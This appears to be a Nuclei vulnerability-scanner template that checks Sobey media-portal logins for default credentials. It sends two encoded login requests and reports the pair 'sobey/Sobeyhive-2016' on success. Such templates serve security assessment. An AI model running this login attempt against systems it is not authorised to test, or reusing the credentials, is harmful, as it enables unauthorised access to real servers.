id: sobey-default-credentials

info:
  name: sobey-default-credentials
  author: SecurityArt
  severity: high
  tags: default-pwd

http:
  - raw:
      - |
        POST /portal//Login/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Cookie: lang=zh; MAM_sid=66e6bfd35f2e4120a81c427a919f6523; site=S1
        Priority: u=0
        Content-Length: 332

        _BSP_REQ_DATA=%7B%22_BSP_ACTION%22%3A%22%2FLogin%2Flogin%22%2C%22authenticationJson%22%3A%22eXMIaE6Xv9KjxhWbTmYeFAXMKQaoFO7pkjpgINkz6L%2FVevJoXSE7PrRE18OKknF3jiclg%2Bf7yurX39pjKiDdcCW7j%2B9mOhqj6KYATbBvC5sIIIIIrRQUcctr3%2BIDjbYTw0s0TJ7fCjk%2BMWcLUzVJ%2F5DRd8zO4XvpHUDVbDcneTLDtZ1xocrog5tZ9ElgOxeEw3YOztGGXgoL0aI4%2Frg3vQ%3D%3D%22%7D

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "token")'
          - 'contains(header, "JSESSIONID")'
        condition: and
    extractors:
      - type: dsl
        dsl:
          - '"sobey/Sobeyhive-2016"'  # 第一个请求成功时输出该结果

  - raw:
      - |
        POST /portal//Login/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Cookie: lang=zh; MAM_sid=66e6bfd35f2e4120a81c427a919f6523; site=S1
        Priority: u=0
        Content-Length: 332

        _BSP_REQ_DATA=%7B%22_BSP_ACTION%22%3A%22%2FLogin%2Flogin%22%2C%22authenticationJson%22%3A%22eXMIaE6Xv9KjxhWbTmYeFAXMKQaoFO7pkjpgINkz6L9qYY5hc7olztT6xjNnoIKlyxtMIwGoBz%2BSWewJTblAYyW7j%2B9mOhqj6KYATbBvC5uFMvsTZRQRdADEC04QUU3Q07zZbaJY0l%2F%2FJCU3ibNAh7OTEG61t%2FPikg25l0X0AaEgKfkg0fWJH3j0Z%2B7ZuFZqtIxkEHZvhpg%3D%22%7D

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "token")'
          - 'contains(header, "JSESSIONID")'
